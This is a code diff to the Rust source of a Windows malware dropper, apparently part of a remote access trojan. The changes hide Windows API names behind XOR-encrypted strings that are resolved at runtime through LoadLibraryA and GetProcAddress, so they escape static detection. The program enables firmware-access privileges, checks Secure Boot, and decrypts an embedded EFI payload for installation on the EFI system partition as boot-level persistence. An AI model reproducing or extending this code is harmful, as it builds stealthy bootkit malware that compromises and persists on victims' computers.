@@ -1,16 +1,22 @@
+use std::collections::HashMap;
 use std::ffi::c_void;
 use std::path::PathBuf;
-use std::{fs, io, ptr};
+use std::{fs, io, mem, ptr};
 
 use rat_common::utils::DropGuard;
-use rat_dropper::{EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, ESP_GUID};
-use windows_sys::Win32::Foundation::{
-    CloseHandle, ERROR_NO_MORE_FILES, ERROR_SUCCESS, GetLastError, HANDLE, INVALID_HANDLE_VALUE,
-    LUID, MAX_PATH,
+use rat_dropper::{
+    AdjustTokenPrivileges, EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, ESP_GUID,
+    GetFirmwareEnvironmentVariableW, LookupPrivilegeValueW, OpenProcessToken, advapi32_dll,
+    kernel32_dll,
 };
+use windows_sys::Win32::Foundation::{
+    CloseHandle, ERROR_NO_MORE_FILES, ERROR_SUCCESS, FARPROC, GetLastError, HANDLE,
+    INVALID_HANDLE_VALUE, LUID, MAX_PATH,
+};
+use windows_sys::Win32::Security::TOKEN_ACCESS_MASK;
 use windows_sys::Win32::Security::{
-    AdjustTokenPrivileges, LUID_AND_ATTRIBUTES, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
-    TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
+    LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
+    TOKEN_QUERY,
 };
 use windows_sys::Win32::Storage::FileSystem::{
     CreateFileW, DeleteVolumeMountPointW, FILE_SHARE_READ, FILE_SHARE_WRITE, FindFirstVolumeW,
@@ -20,35 +26,51 @@ use windows_sys::Win32::System::IO::DeviceIoControl;
 use windows_sys::Win32::System::Ioctl::{
     IOCTL_DISK_GET_PARTITION_INFO_EX, PARTITION_INFORMATION_EX, PARTITION_STYLE_GPT,
 };
-use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
-use windows_sys::Win32::System::WindowsProgramming::GetFirmwareEnvironmentVariableW;
-use windows_sys::core::GUID;
+use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
+use windows_sys::Win32::System::Threading::GetCurrentProcess;
+use windows_sys::core::{BOOL, GUID, PCWSTR};
 use windows_sys::w;
 
-fn write_decrypted_payload(f: &mut fs::File) -> io::Result<()> {
-    let decompressed = EFI_APPLICATION_ENCRYPTED
+fn decrypt(cipher: &[u8]) -> Vec<u8> {
+    cipher
         .iter()
         .zip(EFI_APPLICATION_KEY.iter().cycle())
         .map(|(&c, &k)| c ^ k)
-        .collect::<Vec<u8>>();
+        .collect()
+}
 
+fn write_decrypted_payload(f: &mut fs::File) -> io::Result<()> {
+    let decompressed = decrypt(EFI_APPLICATION_ENCRYPTED);
     let mut decompressor = zstd::Decoder::new(decompressed.as_slice())?;
     io::copy(&mut decompressor, f)?;
 
     Ok(())
 }
 
-fn adjust_privileges() -> bool {
+fn adjust_privileges(symbols: &HashMap<&str, Vec<u8>>) -> bool {
+    let advapi32 = unsafe { LoadLibraryA(symbols["adv32"].as_ptr()) };
+    if advapi32.is_null() {
+        let error = unsafe { GetLastError() };
+        eprintln!("LoadLibraryA adv32 error: 0x{error:X} ({error})");
+        return false;
+    }
+
+    let open_process_token = unsafe {
+        mem::transmute::<
+            FARPROC,
+            unsafe extern "system" fn(HANDLE, TOKEN_ACCESS_MASK, *mut HANDLE) -> BOOL,
+        >(GetProcAddress(advapi32, symbols["OpProcTok"].as_ptr()))
+    };
     let mut token = HANDLE::default();
     if unsafe {
-        OpenProcessToken(
+        open_process_token(
             GetCurrentProcess(),
             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
             &mut token,
         ) == 0
     } {
         let error = unsafe { GetLastError() };
-        eprintln!("OpenProcessToken error: 0x{error:X} ({error})");
+        eprintln!("OpProcTok error: 0x{error:X} ({error})");
         return false;
     }
 
@@ -56,16 +78,22 @@ fn adjust_privileges() -> bool {
         CloseHandle(t);
     });
 
+    let lookup_privilege_value_w = unsafe {
+        mem::transmute::<FARPROC, unsafe extern "system" fn(PCWSTR, PCWSTR, *mut LUID) -> BOOL>(
+            GetProcAddress(advapi32, symbols["LokPrivValW"].as_ptr()),
+        )
+    };
+
     let mut luid = LUID::default();
     if unsafe {
-        LookupPrivilegeValueW(
+        lookup_privilege_value_w(
             ptr::null_mut(),
             w!("SeSystemEnvironmentPrivilege"),
             &mut luid,
         ) == 0
     } {
         let error = unsafe { GetLastError() };
-        eprintln!("LookupPrivilegeValueW error: 0x{error:X} ({error})");
+        eprintln!("LokPrivValW error: 0x{error:X} ({error})");
         return false;
     }
 
@@ -77,12 +105,26 @@ fn adjust_privileges() -> bool {
         }],
     };
 
+    let adjust_token_privileges = unsafe {
+        mem::transmute::<
+            FARPROC,
+            unsafe extern "system" fn(
+                tokenhandle: HANDLE,
+                disableallprivileges: BOOL,
+                newstate: *const TOKEN_PRIVILEGES,
+                bufferlength: u32,
+                previousstate: *mut TOKEN_PRIVILEGES,
+                returnlength: *mut u32,
+            ) -> BOOL,
+        >(GetProcAddress(advapi32, symbols["AdjTokPriv"].as_ptr()))
+    };
+
     unsafe {
-        let _ = AdjustTokenPrivileges(token, 0, &privileges, 0, ptr::null_mut(), ptr::null_mut());
+        let _ = adjust_token_privileges(token, 0, &privileges, 0, ptr::null_mut(), ptr::null_mut());
     }
     if unsafe { GetLastError() != ERROR_SUCCESS } {
         let error = unsafe { GetLastError() };
-        eprintln!("AdjustTokenPrivileges error: 0x{error:X} ({error})");
+        eprintln!("AdjTokPriv error: 0x{error:X} ({error})");
         return false;
     }
 
@@ -260,15 +302,42 @@ fn mount_esp_and_setup_persistence() -> bool {
 }
 
 fn main() {
-    if !adjust_privileges() {
+    let mut symbols = HashMap::new();
+    symbols.insert("adv32", decrypt(advapi32_dll));
+    symbols.insert("OpProcTok", decrypt(OpenProcessToken));
+    symbols.insert("LokPrivValW", decrypt(LookupPrivilegeValueW));
+    symbols.insert("AdjTokPriv", decrypt(AdjustTokenPrivileges));
+    symbols.insert("krnl32", decrypt(kernel32_dll));
+    symbols.insert("GetFrmEnvVarW", decrypt(GetFirmwareEnvironmentVariableW));
+
+    if !adjust_privileges(&symbols) {
         return;
     }
 
     println!("Adjusted privileges successfully");
 
+    let kernel32 = unsafe { LoadLibraryA(symbols["krnl32"].as_ptr()) };
+    if kernel32.is_null() {
+        let error = unsafe { GetLastError() };
+        eprintln!("LoadLibraryA krnl32 error: 0x{error:X} ({error})");
+        return;
+    }
+
+    let get_firmware_environment_variable_w = unsafe {
+        mem::transmute::<
+            FARPROC,
+            unsafe extern "system" fn(
+                lpname: PCWSTR,
+                lpguid: PCWSTR,
+                pbuffer: *mut c_void,
+                nsize: u32,
+            ) -> u32,
+        >(GetProcAddress(kernel32, symbols["GetFrmEnvVarW"].as_ptr()))
+    };
+
     let mut buffer = [0; 128];
     let received = unsafe {
-        GetFirmwareEnvironmentVariableW(
+        get_firmware_environment_variable_w(
             w!("SecureBoot"),
             w!("{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}"),
             buffer.as_mut_ptr() as *mut c_void,
@@ -278,7 +347,7 @@ fn main() {
 
     if received == 0 {
         let error = unsafe { GetLastError() };
-        eprintln!("GetFirmwareEnvironmentVariableW error: 0x{error:X} ({error})");
+        eprintln!("GetFrmEnvVarW error: 0x{error:X} ({error})");
         return;
     }
 
